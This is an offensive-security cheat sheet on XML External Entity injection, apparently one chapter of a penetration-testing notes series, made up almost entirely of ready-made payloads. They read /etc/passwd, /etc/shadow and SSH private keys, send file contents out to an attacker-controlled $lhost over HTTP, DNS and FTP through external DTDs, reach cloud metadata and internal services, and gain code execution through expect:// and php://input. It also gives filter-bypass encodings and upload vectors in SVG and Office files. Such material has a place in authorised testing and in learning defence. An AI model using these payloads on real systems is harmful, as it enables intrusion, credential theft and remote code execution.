# XML External Entity (XXE) Injection

## Table of Contents

- [Basic XXE](#basic-xxe)
- [File Disclosure](#file-disclosure)
- [Blind XXE](#blind-xxe)
- [Error-Based XXE](#error-based-xxe)
- [XXE to SSRF](#xxe-to-ssrf)
- [XXE to RCE](#xxe-to-rce)
- [Filter Bypass](#filter-bypass)
- [XInclude Attack](#xinclude-attack)
- [XXE via File Upload](#xxe-via-file-upload)
- [Payload Cheat Sheet](#payload-cheat-sheet)

---

## Basic XXE

### Classic XXE Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Parameter Entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://$lhost/evil.dtd">
  %xxe;
]>
<root>
  <data>&send;</data>
</root>
```

---

## File Disclosure

### Linux Files

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<foo>&xxe;</foo>
```

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
]>
<foo>&xxe;</foo>
```

### Windows Files

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<foo>&xxe;</foo>
```

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>
```

### PHP Wrapper (Base64 Encoded Source)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>
```

---

## Blind XXE

### Out-of-Band Detection

#### External DTD File (evil.dtd on attacker server)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://$lhost/?data=%file;'>">
%eval;
%exfiltrate;
```

#### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://$lhost/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

### Base64 Exfiltration

#### External DTD (evil.dtd)

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://$lhost/?data=%file;'>">
%eval;
%exfiltrate;
```

### DNS Exfiltration

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://xxe.$lhost/">
  %xxe;
]>
```

### FTP Exfiltration

#### External DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://$lhost:21/%file;'>">
%eval;
%exfiltrate;
```

#### Start FTP Server

```shell
python3 -m pyftpdlib -p 21 -w
```

---

## Error-Based XXE

### External DTD (error.dtd)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Error-Based XXE Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://$lhost/error.dtd">
  %xxe;
]>
<foo>test</foo>
```

Error message will contain file contents.

---

## XXE to SSRF

### Internal Service Probing

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
]>
<foo>&xxe;</foo>
```

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<foo>&xxe;</foo>
```

### Cloud Metadata

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### Internal Network Scanning

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<foo>&xxe;</foo>
```

---

## XXE to RCE

### Expect Wrapper (PHP)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

### PHP Input Wrapper

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://input">
]>
<foo>&xxe;</foo>
```

POST body: `<?php system('id'); ?>`

### Jar Protocol (Java)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://$lhost/evil.jar!/payload.class">
]>
<foo>&xxe;</foo>
```

---

## Filter Bypass

### UTF-7 Encoding

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-
```

### UTF-16 Encoding

```shell
iconv -f UTF-8 -t UTF-16 payload.xml > payload16.xml
```

### HTML Entities in DTD

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:&#x2f;&#x2f;&#x2f;etc&#x2f;passwd">
]>
<foo>&xxe;</foo>
```

### Without Spaces

```xml
<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20"file:///etc/passwd">]><foo>&xxe;</foo>
```

### CDATA Section

```xml
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY fileContent '%start;%file;%end;'>">
]>
<foo>&fileContent;</foo>
```

---

## XInclude Attack

> When you cannot modify DOCTYPE

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## XXE via File Upload

### SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### DOCX/XLSX/PPTX

1. Unzip the file
2. Modify `[Content_Types].xml` or other XML files
3. Inject XXE payload
4. Rezip

---

## Payload Cheat Sheet

| Payload | Description |
| :--- | :--- |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Read local file |
| `<!ENTITY xxe SYSTEM "http://$lhost/">` | SSRF/OOB |
| `<!ENTITY xxe SYSTEM "php://filter/...">` | PHP wrapper |
| `<!ENTITY xxe SYSTEM "expect://id">` | RCE via expect |
| `<!ENTITY % xxe SYSTEM "http://$lhost/evil.dtd">` | External DTD |
| `<!ENTITY xxe SYSTEM "http://169.254.169.254/">` | Cloud metadata |

---

## ðŸ“š See Also

### Related Web Attacks

- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Reconnaissance and vulnerability discovery
- **[SSRF](7.5.SSRF.md)** - XXE can chain to SSRF
- **[File Inclusion](7.3.File-Inclusion.md)** - LFI/RFI for file reading

### Related Topics

- **[Insecure Deserialization](7.12.Insecure-Deserialization.md)** - Similar data parsing vulnerabilities
